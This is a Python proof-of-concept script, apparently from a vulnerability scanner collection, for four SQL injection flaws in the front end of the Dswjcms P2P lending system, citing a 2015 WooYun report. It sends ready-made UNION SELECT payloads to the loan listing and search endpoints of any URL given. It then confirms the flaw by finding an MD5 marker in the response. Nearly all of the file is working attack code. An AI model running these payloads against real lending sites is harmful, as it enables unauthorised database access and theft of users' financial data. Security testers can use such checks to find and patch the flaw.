#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Dswjcms p2p网贷系统前台4处sql注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0141364
author: Lucifer
description: SQL injection。
'''
import sys
import requests



class dswjcms_p2p_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payloads = ["/Win/Index/loanAjax.html?type=1&state=0)%20UnIoN%20SeLeCt%201,2,3,Md5(1234),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%23&classify=1&scope=1",
                    "/Loan/loanAjax.html?type=1&state=1)%20UnIoN%20SeLeCt%201,2,3,Md5(1234),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%23&classify=1&scope=1",
                    "/Loan.html?search=%27%29+UnIoN+SeLeCt+1%2C2%2C3%2CMd5(1234)%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%23"
                    ]
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    return "[+]存在Dswjcms p2p网贷系统注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = dswjcms_p2p_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()